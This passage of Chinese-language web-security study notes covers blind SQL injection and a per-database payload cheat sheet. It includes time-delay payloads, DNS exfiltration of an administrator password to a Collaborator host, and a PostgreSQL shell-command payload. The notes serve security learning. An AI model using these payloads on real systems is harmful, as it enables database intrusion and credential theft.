Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

這顯示了 App 使用我們的輸入構建的完整查詢
- 我們可以看到 injectiion 的完整 SQL，即 WHERE 語句內的單引號字串
- 這使我們更容易構建惡意 payload 的有效查詢
- 在這種情況下，我們可以看到，註釋掉查詢的其餘部分可以防止多餘的單引號破壞語法

偶爾
- 你可能會誘導 App 產生一個 error message，其中包含一些由查詢返回的資料
- 這可以有效地將 blind SQL injection 漏洞變成 visible 的漏洞

方法之一是用 `CAST()` function
- 它使你能夠將一種資料類型轉換成另一種
- 如，以下語句的查詢

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

你試圖讀取的資料是字串。試圖將其轉換為不兼容的資料類型，如 `int`，可能會導致以下的錯誤：

```
ERROR: invalid input syntax for type integer: "Example data"
```

這種類型的查詢在由於對查詢施加的字串限制而無法觸發條件 response 的情況下也可能是有用的

-------------------

## 利用 time delays 來 Exploiting blind SQL injection
前面例子中
- 我們利用 App 不能正確處理 DB 錯誤的方式。但是，如果 App catch 到 error 並優雅地處理它們呢？
- 當 SQL injection 被執行時，觸發 DB error 不再導致 App 的 response 有任何不同
- 所以前面的誘導條件性錯誤的技術將不起作用

在這種情況下
- 可以通過 conditional time delays
- 根據 injection 的條件，利用 blind SQL injection 漏洞
- 因為 SQL 查詢一般是由 App sync 處理的，延遲 SQL 查詢的執行也會延遲 HTTP response
- 這使得我們可以根據收到 HTTP response 的時間來推斷條件式的 `True/False`

Time delay 的技術對於正在使用的 DB 類型來說是非常特定的(也就是說，不同家的 DB，做法有差別)
- Microsoft SQL Server 上，像下面這樣的輸入可以用來測試條件，根據表達式是否為 `True` 來觸發 delay
  - 參考 [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- 第一個輸入不會觸發 delay，因為條件 `1=2` 是 false
- 第二個輸入觸發 10 秒的 dely，因為條件 `1=1` 是 true

```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```


用這技術，我們可以用已經描述過的方式來檢索資料，系統地一次測試一個字：

```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

-------------------

## 用 out-of-band (OAST) 來 Exploiting blind SQL injection

假設 App 執行相同的 SQL 查詢，但以 asnyc 方式進行
- 該 App 繼續在原始 thread 中處理 user 的 request
- 使用另一個 thread 來執行使用跟踪 cookie 的 SQL 查詢
- 該查詢仍然容易受到 SQL injection 的攻擊，然而到目前為止所描述的技術都不會起作用
- App 的 response 並不取決於查詢是否返回任何資料，也不取決於是否發生 db error，更不取決於執行查詢的時間


在這種情況下
- 利用 blind SQL injection 觸發與外部網路的互動，跟你所控制的系統來互動
- 這些可以有條件地觸發，取決於 injection 的條件，以一次推斷出資訊
- 更強大的是，資料可以直接在網路互動本身中被滲出


各種網路協議都可用於此目的
- 但通常最有效的是 DNS
- 因為非常多的 production 環境網路允許 DNS 查詢，因為它們對 production 的正常運行至關重要

使用 out-of-band 最容易的方法是用 [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)
- Burp Suite Professional 內建
- 這是個提供各種網路服務（包括DNS）的 server，並允許你檢測到網路互動何時發生


在不同的 DB 上觸發 DNS 查詢的方法大不相同
- Microsoft SQL Server 上，像下面這樣的輸入可以用來引起對一個指定 domain 的 DNS 查詢
- 這將導致 DB 對 `0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net` domain 進行查詢

```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

可以使用 Burp Collaborator 產生一個專屬的 `subdomain`
- 並輪詢 Collaborator server 以確認何時發生任何 DNS 查詢(DNS lookups)
- 在確認了觸發 out-of-band interactions 後，你就可以使用 out-of-band channel 從有漏洞的 App 中滲出資料了。比如說：

```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```


該輸入讀取 Administrator 的 password
- 附加一個獨特的 Collaborator subdomain，並觸發 DNS lookup
- 這將導致像下面這樣的 DNS lookup，使你能夠查看捕獲的密碼

```
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```

Out-of-band (OAST)
- 是檢測和利用 blind SQL injection 的一種極其強大的方式
- 因為成功的可能性很大，而且能夠在帶外渠道中直接滲出資料


---------------

## 字串連接
可以將多個字串串聯起來，組成單一的字串

|||
| :--- | :--- |
| Oracle | 'foo'||'bar' |
| Microsoft | 'foo'+'bar' |
| PostgreSQL | 'foo'||'bar' |
| MySQL | 'foo' 'bar' [Note the space between the two strings], CONCAT('foo','bar') |


---------------

## Substring
可以從一個指定的偏移量中提取一個字串的一部分，並指定其長度
- 注意，偏移量的 index 是基於 1 的
- 下面的每個表達式都將返回字串 `ba`

|||
| :--- | :--- |
| Oracle | SUBSTR('foobar', 4, 2) |
| Microsoft | SUBSTRING('foobar', 4, 2) |
| PostgreSQL | SUBSTRING('foobar', 4, 2) |
| MySQL | SUBSTRING('foobar', 4, 2) |


---------------

## Comments
可以使用註解來截斷 query，刪除原始 query 中跟隨你輸入的部分


|||
| :--- | :--- |
| Oracle | --comment |
| Microsoft | --comment <br> /*comment*/ |
| PostgreSQL | --comment <br> /*comment*/ |
| MySQL | #comment <br> -- comment [Note the space after the double dash] <br> /*comment*/ |


---------------

## DB 類型與版本
可以查詢 DB 以確定其類型和版本
- 這些資訊在製定更複雜的攻擊時很有用

|||
| :--- | :--- |
| Oracle | SELECT banner FROM v$version <br> SELECT version FROM v$instance |
| Microsoft | SELECT @@version |
| PostgreSQL | SELECT version() |
| MySQL | SELECT @@version |

---------------

## DB contents
你可以列出 DB 中存在的 table，以及這些表所包含的 columns

Oracle
```sql
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
```

Microsoft
```sql
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

PostgreSQL
```sql
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

MySQL
```sql
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```
 

---------------

## Conditional errors
可以測試一個單一的 boolean condition，並在條件為 `true` 時觸發 db error

Oracle
```sql
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
```

Microsoft
```sql
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
```

PostgreSQL
```sql
1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
```

MySQL
```sql
SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
```

---------------


## 分批（或疊加）查詢
可以使用分批查詢來連續執行多個查詢
- 注意，在執行後續查詢的同時，結果不會返回給 App
- 因此，這種技術主要是針對 blind vulnerabilities，你可以使用第二個查詢來觸發 DNS lookup, conditional error or time delay

|||
| :--- | :--- |
| Oracle | Does not support batched queries. |
| Microsoft | `QUERY-1-HERE; QUERY-2-HERE` |
| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE` |
| MySQL | `QUERY-1-HERE; QUERY-2-HERE` |

MySQL
- 分批查詢通常不能被用於 SQL injection
- 然而，如果目標 App 用某些 PHP 或 Python API 與 MySQL DB connect，這偶爾是可能的



---------------

## 時間延遲 (Time delays)
當查詢被處理時，你可以在 DB 中引起一個 time delay
- 下面的內容將導致無條件的 delay 10 sec

|||
| :--- | :--- |
| Oracle | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft | `WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT pg_sleep(10)` |
| MySQL | `SELECT SLEEP(10)` |

---------------

## Conditional time delays
可以測試 boolean condition，並在條件為 `true` 時觸發 time delay

Oracle
```sql
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
```

Microsoft
```sql
IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
```

PostgreSQL
```sql
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
```

MySQL
```sql
SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
```


---------------

## DNS lookup
You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.


## DNS查詢
可以使 DB 對個外部 domain 進行 DNS lookup
- 需要用 `Burp Collaborator` 建立獨立的 Burp Collaborator subdomain
- 在攻擊中使用，然後輪詢 Collaborator server 確認發生了 DNS lookup


Oracle
- 下面的技術利用 XML external entity (XXE) 漏洞來觸發 DNS lookup
- 漏洞已被修補，但仍有許多未修補的 Oracle 設備存在

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

下面的技術在 fully patched 的 Oracle 是可行的，但需要高等級的權限

```sql
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
```

Microsoft
```sql
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
```

PostgreSQL
```sql
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
```

MySQL
- The following techniques work on `Windows` only:

```sql
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```

---------------


## DNS lookup 與資料滲出
DNS lookup 時，包含滲透的資料

Oracle
```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

Microsoft
```sql
declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
```

PostgreSQL
```sql
create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```

MySQL
```sql
The following technique works on Windows only:
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```
